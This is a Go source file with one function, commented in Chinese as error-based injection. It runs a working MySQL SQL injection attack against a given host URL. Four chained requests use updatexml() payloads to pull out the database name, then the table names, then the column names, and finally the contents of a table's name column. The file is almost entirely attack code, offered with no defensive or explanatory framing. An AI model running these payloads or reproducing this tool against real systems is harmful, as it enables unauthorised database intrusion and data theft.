package pkg

import (
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
)

// 报错注入
func errorInject(host string) error {
	var data []string
	payloads := []string{
		" and updatexml(1,concat(0x7e,(select database()),0x7e),1)",
		" and updatexml(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=\"%s\"),0x7e),1)",
		" and updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=\"%s\" and table_name=\"%s\"),0x7e),1)",
		" and updatexml(1,concat(0x7e,(select group_concat(name) from %s),0x7e),1)"}

	req, err := http.Get(host + url.QueryEscape(payloads[0]))
	if err != nil {
		return err
	}
	defer req.Body.Close()
	body, _ := io.ReadAll(req.Body)
	re := regexp.MustCompile(`~(.*)~`)
	match := re.FindStringSubmatch(string(body))
	data = append(data, match[1])
	fmt.Println(data)

	req, err = http.Get(host + url.QueryEscape(fmt.Sprintf(payloads[1], data[0])))
	if err != nil {
		return err
	}
	defer req.Body.Close()
	body, _ = io.ReadAll(req.Body)
	re = regexp.MustCompile(`~(.*)~`)
	match = re.FindStringSubmatch(string(body))
	data = append(data, match[1])
	fmt.Println(data)

	req, err = http.Get(host + url.QueryEscape(fmt.Sprintf(payloads[2], data[0], data[1])))
	if err != nil {
		return err
	}
	defer req.Body.Close()
	body, _ = io.ReadAll(req.Body)
	re = regexp.MustCompile(`~(.*)~`)
	match = re.FindStringSubmatch(string(body))
	data = append(data, match[1])
	fmt.Println(data)

	req, err = http.Get(host + url.QueryEscape(fmt.Sprintf(payloads[3], data[1])))
	if err != nil {
		return err
	}
	defer req.Body.Close()
	body, _ = io.ReadAll(req.Body)
	re = regexp.MustCompile(`~(.*)~`)
	match = re.FindStringSubmatch(string(body))
	data = append(data, match[1])
	fmt.Println(data)
	return nil
}
